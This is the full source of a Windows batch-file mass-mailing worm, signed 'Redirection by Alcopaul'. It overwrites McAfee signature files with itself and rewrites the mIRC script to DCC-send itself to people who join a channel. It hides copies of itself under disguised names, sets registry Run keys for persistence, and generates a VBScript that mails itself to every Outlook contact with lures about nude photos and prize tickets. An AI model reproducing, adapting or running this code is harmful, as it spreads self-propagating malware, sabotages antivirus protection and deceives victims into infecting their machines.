:: console output is turned off and console is redirected to nul to prevent user interruptions
@echo off 
ctty nul
:: Modify McAfee Dat files... Can anyone tell me where the dat files of AVP, Pccllin, fprot are located?
for %%f in (C:\progra~1\mcafee\mcafee~1\*.dat) do copy %0 %%f
:: spread to IRC
del c:\mIRC\script.ini
echo [script] > c:\mIRC\script.ini
echo n0= on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\WINDOWS\XPUpgrade.bat } >> c:\mIRC\script.ini
echo n1= /join #Beginner >> c:\mIRC\script.ini
:: goto root directory
cd\
:: make a hideaway folder, stealth with attrib
md XP
attrib +h +r c:\XP
:: spawn 8 clones.. some will be randomly used in attachments..
copy %0 c:\XP\xp.bat
copy %0 c:\Recycled\xp.bat
copy %0 c:\WINDOWS\HTTPRedirect.htm.bat
copy %0 c:\WINDOWS\SYSTEM32\Redirection.exe.bat
copy %0 c:\WINDOWS\COMMAND\PageRedirect.asp.bat
copy %0 c:\Redirect.php.bat
copy %0 c:\WINDOWS\SYSTEM\Redirection.bat
copy %0 c:\WINDOWS\XPUpgrade.bat
:: modify registry.. make worm run @ startup
echo REGEDIT4 > c:\X.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> c:\X.reg
echo "PX"="c:\\XP\\xp.bat" >> c:\X.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> c:\X.reg
echo "VPX"="c:\\XP\\X.vbs" >> c:\X.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> c:\X.reg
echo "PXV"="c:\\Recycled\\xp.bat" >> c:\X.reg
regedit /s c:\X.reg
del c:\X.reg
:: is all new improved VBScript mailer present in c:\?
if exist c:\X.vbs goto goldfinger
:: if not, make the all new improved VBScript mailer
echo.on error resume next > c:\X.vbs
echo dim a,b,c,d,e >> c:\X.vbs
echo yelp = "Take a look at this.." >> c:\X.vbs
echo sex = "Hello former classmate.. I'm Heather and I have included a file which will redirect you to my webpage.. Full of nude picutres and stuff.. See you soon." >> c:\X.vbs
echo drugs = "You've won a free plane ticket to Hawaii. To claim your prize, we included a redirection software for security purposes. Only from FlyHawaii.com" >> c:\X.vbs
echo ass = "Wscript.Shell" >> c:\X.vbs
echo reg = "Check out my nude picture gallery.. Sarah.." >> c:\X.vbs
echo carry = "Hi there!" >> c:\X.vbs
echo hole = "Outlook.Application" >> c:\X.vbs
echo eins = "Hey.. Your mom sent me this message.. How dare your mom talk to me like that.. Shit!" >> c:\X.vbs
echo shit = "MAPI" >> c:\X.vbs
echo cum = "Hi there..You've just won a free backstage pass... Watch your favourite band/boyband perform live..Just tell us who do you want to see by clicking at this redirection software.. We make dreams come true..FreePasses.com" >> c:\X.vbs
echo dork = "Hello!" >> c:\X.vbs
echo suck = "I wanna tell you how much I adore you.." >> c:\X.vbs
echo set a = Wscript.CreateObject(ass) >> c:\X.vbs
echo punk = array(yelp, carry, dork, suck) >> c:\X.vbs
echo Randomize >> c:\X.vbs
echo rock = punk(Int(Rnd * 4)) >> c:\X.vbs
echo set b = CreateObject(hole) >> c:\X.vbs
echo set c = b.GetNameSpace(shit) >> c:\X.vbs
echo ska = array(cum, eins, sex, drugs, reg, yelp) >> c:\X.vbs
echo Randomize >> c:\X.vbs
echo reggae = ska(Int(Rnd * 6)) >> c:\X.vbs
echo for y = 1 To c.AddressLists.Count >> c:\X.vbs
echo phile = "c:\WINDOWS\HTTPRedirect.htm.bat" >> c:\X.vbs
echo set d = c.AddressLists(y) >> c:\X.vbs
echo phile1 = "c:\WINDOWS\SYSTEM32\Redirection.exe.bat" >> c:\X.vbs
echo x = 1 >> c:\X.vbs
echo set e = b.CreateItem(0) >> c:\X.vbs
echo phile2 = "c:\WINDOWS\COMMAND\PageRedirect.asp.bat" >> c:\X.vbs
echo for o = 1 To d.AddressEntries.Count >> c:\X.vbs
echo f = d.AddressEntries(x) >> c:\X.vbs
echo e.Recipients.Add f >> c:\X.vbs
echo x = x + 1 >> c:\X.vbs
echo next >> c:\X.vbs
echo e.Subject = rock >> c:\X.vbs
echo phile3 = "c:\Redirect.php.bat" >> c:\X.vbs
echo e.Body = reggae >> c:\X.vbs
echo phile4 = "c:\WINDOWS\SYSTEM\Redirection.bat" >> c:\X.vbs
echo guns = array(phile, phile1, phile2, phile3, phile4) >> c:\X.vbs
echo Randomize >> c:\X.vbs
echo roses = guns(Int(Rnd * 5)) >> c:\X.vbs
echo e.Attachments.Add (roses) >> c:\X.vbs
echo e.DeleteAfterSubmit = True >> c:\X.vbs
echo e.Send >> c:\X.vbs
echo f = "" >> c:\X.vbs
echo next >> c:\X.vbs
:: put a copy of mailer in hideaway directory
copy c:\X.vbs c:\XP
:: Mailer present
:goldfinger
:: for assurance
copy c:\X.vbs c:\XP
:: Mail with attachment
start c:\X.vbs
:: hide core files
attrib +h +r c:\X.vbs
attrib +h +r c:\XP\X.vbs
attrib +h +r c:\XP\xp.bat
:: Good bye!
exit
::Redirection by Alcopaul